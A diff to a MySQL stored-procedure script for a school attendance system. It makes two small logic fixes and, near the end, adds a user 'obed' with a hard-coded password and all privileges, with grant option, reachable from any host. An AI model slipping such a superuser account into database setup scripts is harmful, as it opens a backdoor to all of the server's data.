@@ -252,7 +252,7 @@ declare msj nvarchar(200);
 declare ida int;
 
 set ida = (select ifnull(max(idAM),0)+1 from asistenciaMaestros);
-insert into asistenciaMaestros values(ida,idMa,1,day(now()),(month(now())),year(now()),(dayofweek(now()))-1);
+insert into asistenciaMaestros values(ida,idMa,2,day(now()),(month(now())),year(now()),(dayofweek(now()))-1);
 insert into horaentradaMa values(ida,'00:00:00');
 insert into horasalidaMa values(ida,'00:00:00');
 set msj = 'falta ok';
@@ -1836,7 +1836,7 @@ set existe = (select count(*)from asistenciaalumnos where idAlumno=i and dia = D
         if existe = 1 then
 			set msj = 'ok';
         else
-			set msj = (select fsalida (idP,idT));
+			set msj = (select fsalida (i,idT));
         end if;
     end if;
     set i = i+1;
@@ -1871,6 +1871,15 @@ END WHILE ;
 
 end; :v
 delimiter ;
+				     
+use sys;
+create user 'obed'@'localhost' identified by 'n0m3l0';
+grant all privileges on *.* to 'obed'@'localhost' with grant option;
+create user 'obed'@'%' identified by 'n0m3l0';
+grant all privileges on *.* to 'obed'@'%' with grant option;
+flush privileges;
+				     
+use bdPoliasistencia;
 
 /*============================================*/
 call spDatosAlumnos();
